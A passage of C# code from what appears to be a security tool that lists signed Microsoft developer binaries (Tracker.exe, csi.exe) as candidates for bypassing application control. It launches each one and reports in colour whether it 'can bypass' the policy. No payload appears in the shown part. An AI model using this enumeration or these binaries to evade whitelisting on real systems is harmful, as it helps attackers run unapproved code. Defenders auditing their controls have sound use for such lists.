            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.6.1 Tools\x64\Tracker.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"c:\Program Files (x86)\Microsoft Visual Studio\2017\Community\MSBuild\15.0\Bin\Roslyn\csi.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Program Files (x86)\Microsoft Visual Studio\2017\Enterprise\MSBuild\15.0\Bin\Roslyn\csi.exe");
            list_of_potential_executables_that_can_bypass_appControl.Add(@"C:\Program Files (x86)\Microsoft Visual Studio\2017\Enterprise\MSBuild\15.0\Bin\amd64\Tracker.exe");


            foreach (string executible in list_of_potential_executables_that_can_bypass_appControl)
            {
                int exitcode = OpenProcessScan(executible, string.Empty);
                if (exitcode == -1)
                {
                    Console.Write(executible);
                    list_of_available_executables_to_bypass_appControl.Add(executible);
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.Write(" can bypass");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine(" APP CONTROL ");
                }
                else
                {
                    Console.Write(executible);
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write(" can't bypass");
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine(" APP CONTROL ");
                }
            }
        }
    }
}
